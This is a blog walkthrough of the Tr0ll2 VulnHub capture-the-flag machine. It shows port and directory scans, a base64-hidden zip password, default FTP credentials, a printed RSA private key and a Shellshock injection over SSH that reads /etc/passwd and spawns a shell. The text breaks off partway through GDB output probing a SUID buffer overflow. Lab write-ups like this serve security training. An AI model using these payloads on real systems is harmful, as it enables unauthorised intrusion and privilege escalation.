
<!DOCTYPE HTML>
<html>
<head>
	<meta charset="utf-8">
	<title>Please do not feed the trolls. - FourFourFourFour</title>
	<meta name="author" content="recrudesce">

	
	<meta name="description" content="Maleus released Tr0ll a while ago, and while I didn&rsquo;t attempt it, I figured I&rsquo;d do the follow up - Tr0ll2. So, here is a quick runthrough &hellip;">
	
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

	<link href="/atom.xml" rel="alternate" title="FourFourFourFour" type="application/atom+xml">
	<link rel="canonical" href="">
	<link href="/favicon.png" rel="shortcut icon">
	<link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
	<!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
	<script async="true" src="//ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
	
</head>


<body>
	<header id="header" class="inner"><h1><a href="/">FourFourFourFour</a></h1>
<nav id="main-nav"><ul class="main">
	<li><a href="/">Blog</a></li>
	<li><a href="/archives">Archives</a></li>
</ul>
</nav>
<nav id="mobile-nav">
	<div class="alignleft menu">
		<a class="button">Menu</a>
		<div class="container"><ul class="main">
	<li><a href="/">Blog</a></li>
	<li><a href="/archives">Archives</a></li>
</ul>
</div>
	</div>
	<div class="alignright search">
		<a class="button"></a>
		<div class="container">
			<form action="https://www.google.com/search" method="get">
				<input type="text" name="q" results="0">
				<input type="hidden" name="q" value="site:recrudesce.github.io">
			</form>
		</div>
	</div>
</nav>
<nav id="sub-nav" class="alignright">
	<div class="social">
		
		
		
		<a class="twitter" href="http://twitter.com/recrudesce" title="Twitter">Twitter</a>
		
		
    
		
		
		
		
		
		<a class="rss" href="/atom.xml" title="RSS">RSS</a>
		
    
	</div>
	<form class="search" action="https://www.google.com/search" method="get">
		<input class="alignright" type="text" name="q" results="0">
		<input type="hidden" name="q" value="site:recrudesce.github.io">
	</form>
</nav>

</header>
	
		
	
	<div id="content" class="inner"><article class="post">
	<h2 class="title">Please Do Not Feed the Trolls.</h2>
	<div class="entry-content"><p><a href="https://twitter.com/Maleus21">Maleus</a> released <a href="http://vulnhub.com/entry/tr0ll-1,100/">Tr0ll</a> a while ago, and while I didn&rsquo;t attempt it, I figured I&rsquo;d do the follow up - <a href="http://vulnhub.com/entry/tr0ll-2,107/">Tr0ll2</a>. So, here is a quick runthrough of how to pwn it.</p>

<p>I would put this VM at beginner level - it&rsquo;s not particularly complicated. It&rsquo;s more a case of finding hidden data than actually doing any vulnerability exploitation. Lets get started.</p>

<!-- more -->


<p><img src="http://www.zerodayclothing.com/products/designs/trinity_design.png" alt="" /></p>

<p>And so should you.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# nmap -sS -T5 -p- --script banner 172.16.56.138
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.47 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2014-10-23 15:27 BST
</span><span class='line'>Nmap scan report <span class="k">for</span> 172.16.56.138
</span><span class='line'>Host is up <span class="o">(</span>0.00020s latency<span class="o">)</span>.
</span><span class='line'>Not shown: <span class="m">65532</span> closed ports
</span><span class='line'>PORT   STATE SERVICE
</span><span class='line'>21/tcp open  ftp
</span><span class='line'><span class="p">|</span>_banner: <span class="m">220</span> Welcome to Tr0ll FTP... Only noobs stay <span class="k">for</span> a <span class="k">while</span>...
</span><span class='line'>22/tcp open  ssh
</span><span class='line'><span class="p">|</span>_banner: SSH-2.0-OpenSSH_5.9p1 Debian-5ubuntu1.4
</span><span class='line'>80/tcp open  http
</span><span class='line'>MAC Address: 00:0C:29:14:2B:52 <span class="o">(</span>VMware<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 19.78 seconds
</span><span class='line'>root@pwk:~#
</span></code></pre></td></tr></table></div></figure>


<p>FTP, SSH and HTTP. Lets hit the HTTP server first, as that&rsquo;s where Tr0ll started.</p>

<p><a href="/images/tr0ll2_001.png"><img src="/images/tr0ll2_001.png" alt="tr0ll2_001" /></a></p>

<p>So, the usual then. A quick Nikto scan shows that there&rsquo;s a robots.txt file, which has the following in it</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>User-agent:*
</span><span class='line'>Disallow:
</span><span class='line'>/noob
</span><span class='line'>/nope
</span><span class='line'>/try_harder
</span><span class='line'>/keep_trying
</span><span class='line'>/isnt_this_annoying
</span><span class='line'>/nothing_here
</span><span class='line'>/404
</span><span class='line'>/LOL_at_the_last_one
</span><span class='line'>/trolling_is_fun
</span><span class='line'>/zomg_is_this_it
</span><span class='line'>/you_found_me
</span><span class='line'>/I_know_this_sucks
</span><span class='line'>/You_could_give_up
</span><span class='line'>/dont_bother
</span><span class='line'>/will_it_ever_end
</span><span class='line'>/I_hope_you_scripted_this
</span><span class='line'>/ok_this_is_it
</span><span class='line'>/stop_whining
</span><span class='line'>/why_are_you_still_looking
</span><span class='line'>/just_quit
</span><span class='line'>/seriously_stop
</span></code></pre></td></tr></table></div></figure>


<p>Using this as a wordlist for dirb shows that only 4 of these directories actually result in an HTTP response other than 404.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# dirb http://172.16.56.138 troll_url.txt
</span><span class='line'>
</span><span class='line'>-----------------
</span><span class='line'>DIRB v2.21
</span><span class='line'>By The Dark Raver
</span><span class='line'>-----------------
</span><span class='line'>
</span><span class='line'>START_TIME: Thu Oct <span class="m">23</span> 15:31:32 2014
</span><span class='line'>URL_BASE: http://172.16.56.138/
</span><span class='line'>WORDLIST_FILES: troll_url.txt
</span><span class='line'>
</span><span class='line'>-----------------
</span><span class='line'>
</span><span class='line'>GENERATED WORDS: <span class="m">21</span>
</span><span class='line'>
</span><span class='line'>---- Scanning URL: http://172.16.56.138/ ----
</span><span class='line'><span class="o">==</span>&gt; DIRECTORY: http://172.16.56.138/noob/
</span><span class='line'><span class="o">==</span>&gt; DIRECTORY: http://172.16.56.138/keep_trying/
</span><span class='line'><span class="o">==</span>&gt; DIRECTORY: http://172.16.56.138/dont_bother/
</span><span class='line'><span class="o">==</span>&gt; DIRECTORY: http://172.16.56.138/ok_this_is_it/
</span><span class='line'>
</span><span class='line'>---- Entering directory: http://172.16.56.138/noob/ ----
</span><span class='line'>
</span><span class='line'>---- Entering directory: http://172.16.56.138/keep_trying/ ----
</span><span class='line'>
</span><span class='line'>---- Entering directory: http://172.16.56.138/dont_bother/ ----
</span><span class='line'>
</span><span class='line'>---- Entering directory: http://172.16.56.138/ok_this_is_it/ ----
</span><span class='line'>
</span><span class='line'>-----------------
</span><span class='line'>DOWNLOADED: <span class="m">105</span> - FOUND: 0
</span><span class='line'>root@pwk:~/troll#
</span></code></pre></td></tr></table></div></figure>


<p>Visiting these URL&rsquo;s provide the following page
<a href="/images/tr0ll2_002.png"><img src="/images/tr0ll2_002.png" alt="tr0ll2_002" /></a></p>

<p>While it looks like the page is identical for each of the 4 directories, on closer inspection, one of the images shown is slightly larger than the rest - this was determined by downloading each image.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>-rw-r--r-- <span class="m">1</span> root root   <span class="m">15831</span> Oct  <span class="m">4</span> 09:57 cat_the_troll.jpg
</span><span class='line'>-rw-r--r-- <span class="m">1</span> root root   <span class="m">15873</span> Oct  <span class="m">4</span> 09:31 cat_the_troll.jpg.1
</span></code></pre></td></tr></table></div></figure>


<p>Running strings (NOOOO !!!!) on this file results in the following output</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Look Deep within y0ur_self <span class="k">for</span> the answer
</span><span class='line'>root@pwk:~#
</span></code></pre></td></tr></table></div></figure>


<p>Which just so happens to be a folder on the webserver, containing an answer.txt file. Short story shorter, answer.txt is just a dictionary file but with each individual line base64 encoded.
On visual inspection, one line stands out&hellip; (yes, I could probably have written something, but scrolling through a large file and noticing strange anomalies is my bag, ok ?)</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>SXNzYWNoYXIK
</span><span class='line'>SXN0YW5idWwK
</span><span class='line'>SXN0YW5idWwK
</span><span class='line'>SXN1enUK
</span><span class='line'>SXN1enUK
</span><span class='line'>SXQK
</span><span class='line'>SXRDYW50UmVhbGx5QmVUaGlzRWFzeVJpZ2h0TE9MCg==
</span><span class='line'>SXRhaXB1Cg==
</span><span class='line'>SXRhaXB1Cg==
</span><span class='line'>SXRhbGlhbgo=
</span><span class='line'>SXRhbGlhbgo=
</span><span class='line'>SXRhbGlhbnMK
</span><span class='line'>SXRhbHkK
</span></code></pre></td></tr></table></div></figure>


<p>Decoded, we get</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# <span class="nb">echo </span><span class="nv">SXRDYW50UmVhbGx5QmVUaGlzRWFzeVJpZ2h0TE9MCg</span><span class="o">==</span> <span class="p">|</span> base64 -d
</span><span class='line'>ItCantReallyBeThisEasyRightLOL
</span></code></pre></td></tr></table></div></figure>


<p><img src="http://i780.photobucket.com/albums/yy82/dguy210/facepalm-star-trek-o_zps1270c857.gif" alt="" /></p>

<p>So, we&rsquo;ve exhausted the HTTP server by this point, so lets move onto FTP. I won&rsquo;t bore you with details, but the username and password combo is Tr0ll:Tr0ll. The only file residing on the FTP server is a ZIP file.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# ftp 172.16.56.138
</span><span class='line'>Connected to 172.16.56.138.
</span><span class='line'><span class="m">220</span> Welcome to Tr0ll FTP... Only noobs stay <span class="k">for</span> a <span class="k">while</span>...
</span><span class='line'>Name <span class="o">(</span>172.16.56.138:root<span class="o">)</span>: Tr0ll
</span><span class='line'><span class="m">331</span> Please specify the password.
</span><span class='line'>Password: Tr0ll
</span><span class='line'><span class="m">230</span> Login successful.
</span><span class='line'>Remote system <span class="nb">type </span>is UNIX.
</span><span class='line'>Using binary mode to transfer files.
</span><span class='line'>ftp&gt; ls -l
</span><span class='line'><span class="m">200</span> PORT <span class="nb">command </span>successful. Consider using PASV.
</span><span class='line'><span class="m">150</span> Here comes the directory listing.
</span><span class='line'>-rw-r--r--    <span class="m">1</span> <span class="m">0</span>        <span class="m">0</span>            <span class="m">1474</span> Oct <span class="m">04</span> 01:09 lmao.zip
</span><span class='line'><span class="m">226</span> Directory send OK.
</span><span class='line'>ftp&gt;
</span></code></pre></td></tr></table></div></figure>


<p>On extracting the ZIP file, we are asked for a password&hellip; lets try &ldquo;ItCantReallyBeThisEasyRightLOL&rdquo;</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# unzip lmao.zip
</span><span class='line'>Archive:  lmao.zip
</span><span class='line'><span class="o">[</span>lmao.zip<span class="o">]</span> noob password: ItCantReallyBeThisEasyRightLOL
</span><span class='line'>  inflating: noob
</span></code></pre></td></tr></table></div></figure>


<p>which turns out to be an RSA private key - this is our route in via SSH.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>-----BEGIN RSA PRIVATE KEY-----
</span><span class='line'>MIIEpAIBAAKCAQEAsIthv5CzMo5v663EMpilasuBIFMiftzsr+w+UFe9yFhAoLqq
</span><span class='line'>yDSPjrmPsyFePcpHmwWEdeR5AWIv/RmGZh0Q+Qh6vSPswix7//SnX/QHvh0CGhf1
</span><span class='line'>/9zwtJSMely5oCGOujMLjDZjryu1PKxET1CcUpiylr2kgD/fy11Th33KwmcsgnPo
</span><span class='line'>q+pMbCh86IzNBEXrBdkYCn222djBaq+mEjvfqIXWQYBlZ3HNZ4LVtG+5in9bvkU5
</span><span class='line'>z+13lsTpA9px6YIbyrPMMFzcOrxNdpTY86ozw02+MmFaYfMxyj2GbLej0+qniwKy
</span><span class='line'>e5SsF+eNBRKdqvSYtsVE11SwQmF4imdJO0buvQIDAQABAoIBAA8ltlpQWP+yduna
</span><span class='line'>u+W3cSHrmgWi/Ge0Ht6tP193V8IzyD/CJFsPH24Yf7rX1xUoIOKtI4NV+gfjW8i0
</span><span class='line'>gvKJ9eXYE2fdCDhUxsLcQ+wYrP1j0cVZXvL4CvMDd9Yb1JVnq65QKOJ73CuwbVlq
</span><span class='line'>UmYXvYHcth324YFbeaEiPcN3SIlLWms0pdA71Lc8kYKfgUK8UQ9Q3u58Ehlxv079
</span><span class='line'>La35u5VH7GSKeey72655A+t6d1ZrrnjaRXmaec/j3Kvse2GrXJFhZ2IEDAfa0GXR
</span><span class='line'>xgl4PyN8O0L+TgBNI/5nnTSQqbjUiu+aOoRCs0856EEpfnGte41AppO99hdPTAKP
</span><span class='line'>aq/r7+UCgYEA17OaQ69KGRdvNRNvRo4abtiKVFSSqCKMasiL6aZ8NIqNfIVTMtTW
</span><span class='line'>K+WPmz657n1oapaPfkiMRhXBCLjR7HHLeP5RaDQtOrNBfPSi7AlTPrRxDPQUxyxx
</span><span class='line'>n48iIflln6u85KYEjQbHHkA3MdJBX2yYFp/w6pYtKfp15BDA8s4v9HMCgYEA0YcB
</span><span class='line'>TEJvcW1XUT93ZsN+lOo/xlXDsf+9Njrci+G8l7jJEAFWptb/9ELc8phiZUHa2dIh
</span><span class='line'>WBpYEanp2r+fKEQwLtoihstceSamdrLsskPhA4xF3zc3c1ubJOUfsJBfbwhX1tQv
</span><span class='line'>ibsKq9kucenZOnT/WU8L51Ni5lTJa4HTQwQe9A8CgYEAidHV1T1g6NtSUOVUCg6t
</span><span class='line'>0PlGmU9YTVmVwnzU+LtJTQDiGhfN6wKWvYF12kmf30P9vWzpzlRoXDd2GS6N4rdq
</span><span class='line'>vKoyNZRw+bqjM0XT+2CR8dS1DwO9au14w+xecLq7NeQzUxzId5tHCosZORoQbvoh
</span><span class='line'>ywLymdDOlq3TOZ+CySD4/wUCgYEAr/ybRHhQro7OVnneSjxNp7qRUn9a3bkWLeSG
</span><span class='line'>th8mjrEwf/b/1yai2YEHn+QKUU5dCbOLOjr2We/Dcm6cue98IP4rHdjVlRS3oN9s
</span><span class='line'>G9cTui0pyvDP7F63Eug4E89PuSziyphyTVcDAZBriFaIlKcMivDv6J6LZTc17sye
</span><span class='line'>q51celUCgYAKE153nmgLIZjw6+FQcGYUl5FGfStUY05sOh8kxwBBGHW4/fC77+NO
</span><span class='line'>vW6CYeE+bA2AQmiIGj5CqlNyecZ08j4Ot/W3IiRlkobhO07p3nj601d+OgTjjgKG
</span><span class='line'>zp8XZNG8Xwnd5K59AVXZeiLe2LGeYbUKGbHyKE3wEVTTEmgaxF4D1g==
</span><span class='line'>-----END RSA PRIVATE KEY-----
</span></code></pre></td></tr></table></div></figure>


<p>It is possible to SSH into the VM using the noob user, as per the key&rsquo;s filename, but we are immediately disconnected.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# ssh -i key.key noob@172.16.56.138
</span><span class='line'>TRY HARDER LOL!
</span><span class='line'>Connection to 172.16.56.138 closed.
</span><span class='line'>root@pwk:~#
</span></code></pre></td></tr></table></div></figure>


<p>Standard things here like &ndash;norc don&rsquo;t work, so lets try something new. SHELLSHOCK !</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# ssh -i key.key noob@172.16.56.138 <span class="s1">&#39;() { :;}; cat /etc/passwd&#39;</span>
</span><span class='line'>root:x:0:0:root:/root:/bin/bash
</span><span class='line'>daemon:x:1:1:daemon:/usr/sbin:/bin/sh
</span><span class='line'>bin:x:2:2:bin:/bin:/bin/sh
</span><span class='line'>sys:x:3:3:sys:/dev:/bin/sh
</span><span class='line'>sync:x:4:65534:sync:/bin:/bin/sync
</span><span class='line'>games:x:5:60:games:/usr/games:/bin/sh
</span><span class='line'>man:x:6:12:man:/var/cache/man:/bin/sh
</span><span class='line'>lp:x:7:7:lp:/var/spool/lpd:/bin/sh
</span><span class='line'>mail:x:8:8:mail:/var/mail:/bin/sh
</span><span class='line'>news:x:9:9:news:/var/spool/news:/bin/sh
</span><span class='line'>uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
</span><span class='line'>proxy:x:13:13:proxy:/bin:/bin/sh
</span><span class='line'>www-data:x:33:33:www-data:/var/www:/bin/sh
</span><span class='line'>backup:x:34:34:backup:/var/backups:/bin/sh
</span><span class='line'>list:x:38:38:Mailing List Manager:/var/list:/bin/sh
</span><span class='line'>irc:x:39:39:ircd:/var/run/ircd:/bin/sh
</span><span class='line'>gnats:x:41:41:Gnats Bug-Reporting System <span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/bin/sh
</span><span class='line'>nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
</span><span class='line'>libuuid:x:100:101::/var/lib/libuuid:/bin/sh
</span><span class='line'>syslog:x:101:103::/home/syslog:/bin/false
</span><span class='line'>messagebus:x:102:104::/var/run/dbus:/bin/false
</span><span class='line'>maleus:x:1000:1000:Tr0ll,,,:/home/maleus:/bin/bash
</span><span class='line'>sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
</span><span class='line'>ftp:x:104:111:ftp daemon,,,:/srv/ftp:/bin/false
</span><span class='line'>noob:x:1002:1002::/home/noob:/bin/bash
</span><span class='line'>Tr0ll:x:1001:1001::/home/tr0ll:/bin/false
</span><span class='line'>root@pwk:~#
</span></code></pre></td></tr></table></div></figure>


<p>Yup, we can get a shell with this using &lsquo;() { :;}; /bin/bash&rsquo;</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# ssh -i key.key noob@172.16.56.138 <span class="s1">&#39;() { :;}; /bin/bash&#39;</span>
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>noob<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>noob<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1002<span class="o">(</span>noob<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>A small bit of enumeration here identifies the following folder structure</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nb">pwd</span>
</span><span class='line'>/nothing_to_see_here/choose_wisely
</span><span class='line'>ls -l
</span><span class='line'>total 12
</span><span class='line'>drwsr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Oct  <span class="m">5</span> 21:16 door1
</span><span class='line'>drwsr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Oct  <span class="m">5</span> 21:19 door2
</span><span class='line'>drwsr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Oct  <span class="m">5</span> 21:17 door3
</span></code></pre></td></tr></table></div></figure>


<p>Each door folder includes a file called r00t, which is a binary. However, there are 3 different versions. One of them puts you into an rbash shell for 2 minutes, one of them kicks you out and reboots the VM, and the other one (the largest one) repeats anything you provide it via stdin. These files are SUID, so, looks like we have a standard buffer overflow here.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>-rwsr-xr-x <span class="m">1</span> root root <span class="m">7273</span> Oct  <span class="m">5</span> 21:16 r00t
</span><span class='line'>-rwsr-xr-x <span class="m">1</span> root root <span class="m">8401</span> Oct  <span class="m">5</span> 21:16 r00t
</span><span class='line'>-rwsr-xr-x <span class="m">1</span> root root <span class="m">7271</span> Oct  <span class="m">5</span> 21:17 r00t
</span></code></pre></td></tr></table></div></figure>


<p>Something to note here before we carry on - a scheduled script rotates these files, so make sure you always work on the file that is 8401 bytes large - you may have to change into a different door directory.</p>

<p>Loading the file in GDB shows that you can easily overflow it with about 300 bytes of input.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# gdb ./r00t
</span><span class='line'>GNU gdb <span class="o">(</span>GDB<span class="o">)</span> 7.4.1-debian
</span><span class='line'>Copyright <span class="o">(</span>C<span class="o">)</span> <span class="m">2012</span> Free Software Foundation, Inc.
</span><span class='line'>License GPLv3+: GNU GPL version <span class="m">3</span> or later &lt;http://gnu.org/licenses/gpl.html&gt;
</span><span class='line'>This is free software: you are free to change and redistribute it.
</span><span class='line'>There is NO WARRANTY, to the extent permitted by law.  Type <span class="s2">&quot;show copying&quot;</span>
</span><span class='line'>and <span class="s2">&quot;show warranty&quot;</span> <span class="k">for</span> details.
</span><span class='line'>This GDB was configured as <span class="s2">&quot;i486-linux-gnu&quot;</span>.
</span><span class='line'>For bug reporting instructions, please see:
</span><span class='line'>&lt;http://www.gnu.org/software/gdb/bugs/&gt;...
</span><span class='line'>Reading symbols from /root/troll/r00t...done.
</span><span class='line'>gdb-peda<span class="nv">$ </span>r <span class="k">$(</span>python -c <span class="s1">&#39;print &quot;A&quot;*300&#39;</span><span class="k">)</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'><span class="o">[</span>----------------------------------registers-----------------------------------<span class="o">]</span>
</span><span class='line'>EAX: 0x12c
</span><span class='line'>EBX: 0xb7fbeff4 --&gt; 0x15ed7c
</span><span class='line'>ECX: 0xbffff4d8 --&gt; 0xb7fbf4e0 --&gt; 0xfbad2a84
</span><span class='line'>EDX: 0xb7fc0360 --&gt; 0x0
</span><span class='line'>ESI: 0x0
</span><span class='line'>EDI: 0x0
</span><span class='line'>EBP: 0x41414141 <span class="o">(</span><span class="s1">&#39;AAAA&#39;</span><span class="o">)</span>
</span><span class='line'>ESP: 0xbffff610 <span class="o">(</span><span class="s1">&#39;A&#39;</span> &lt;repeats <span class="m">28</span> <span class="nb">times</span>&gt;<span class="o">)</span>
</span><span class='line'>EIP: 0x41414141 <span class="o">(</span><span class="s1">&#39;AAAA&#39;</span><span class="o">)</span>
</span><span class='line'>EFLAGS: 0x10296 <span class="o">(</span>carry PARITY ADJUST zero SIGN <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
</span><span class='line'><span class="o">[</span>-------------------------------------code-------------------------------------<span class="o">]</span>
</span><span class='line'>Invalid <span class="nv">$PC</span> address: 0x41414141
</span><span class='line'><span class="o">[</span>------------------------------------stack-------------------------------------<span class="o">]</span>
